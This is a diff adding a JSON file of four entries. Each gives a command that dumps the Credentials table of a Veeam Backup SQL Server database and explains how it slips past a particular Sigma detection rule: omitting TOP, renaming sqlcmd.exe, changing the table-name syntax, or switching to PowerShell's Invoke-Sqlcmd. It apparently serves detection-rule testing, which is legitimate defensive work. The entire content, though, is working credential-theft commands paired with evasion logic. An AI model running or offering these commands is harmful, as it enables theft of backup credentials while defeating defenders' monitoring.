@@ -1,0 +1,18 @@
+[
+  {
+    "output": "sqlcmd.exe -E -S localhost -Q \"SELECT * FROM [VeeamBackup].[dbo].[Credentials]\"",
+    "explanation": "The Sigma rule specifically looks for the 'TOP' keyword in the command line (CommandLine|contains|all). By omitting 'TOP' from the SQL query and just selecting all rows, the condition is not met and the rule is bypassed."
+  },
+  {
+    "output": "copy \"C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\sqlcmd.exe\" C:\\Temp\\custom_cmd.exe && C:\\Temp\\custom_cmd.exe -E -S localhost -Q \"SELECT TOP 10 * FROM [VeeamBackup].[dbo].[Credentials]\"",
+    "explanation": "The rule relies on the executable image ending with '\\sqlcmd.exe'. Copying or renaming the sqlcmd.exe binary to a different name before execution completely bypasses the 'selection_tools' criteria."
+  },
+  {
+    "output": "sqlcmd.exe -E -S localhost -Q \"SELECT TOP 10 * FROM VeeamBackup..Credentials\"",
+    "explanation": "The rule enforces a strict string match for '[VeeamBackup].[dbo].[Credentials]'. SQL Server syntax allows omitting the 'dbo' schema and the brackets. Changing the syntax to 'VeeamBackup..Credentials' executes the same query but evades the string matching logic."
+  },
+  {
+    "output": "powershell -Command \"Invoke-Sqlcmd -Query 'SELECT TOP 10 * FROM [VeeamBackup].[dbo].[Credentials]' -ServerInstance localhost\"",
+    "explanation": "The rule specifically targets 'sqlcmd.exe'. Using alternative tools natively available, such as the Invoke-Sqlcmd cmdlet in PowerShell, accomplishes the same database extraction without triggering the 'selection_tools' filter."
+  }
+]
